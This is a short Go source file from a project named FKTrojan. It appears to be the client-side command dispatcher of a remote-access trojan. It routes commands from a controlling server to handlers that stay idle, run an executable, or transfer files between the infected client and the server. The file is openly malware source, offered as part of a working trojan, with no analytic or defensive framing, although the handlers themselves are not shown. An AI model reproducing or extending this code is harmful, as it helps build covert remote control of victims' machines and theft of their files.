package command_handler_client

import (
	. "FKTrojan/dao"
	"fmt"
)

// command通道client端处理
func ClientDo(cmd *Command, client *Client) error {
	code := cmd.Code
	switch code {
	case CMD_IDLE:
		return idleCmd(cmd)
	case CMD_RUN_EXE:
		return standardCmd(cmd)
	case CMD_TRANS_C_TO_S, CMD_TRANS_S_TO_C:
		return transferCmd(cmd)
	}
	return fmt.Errorf("unknown cmd %v", cmd)
}
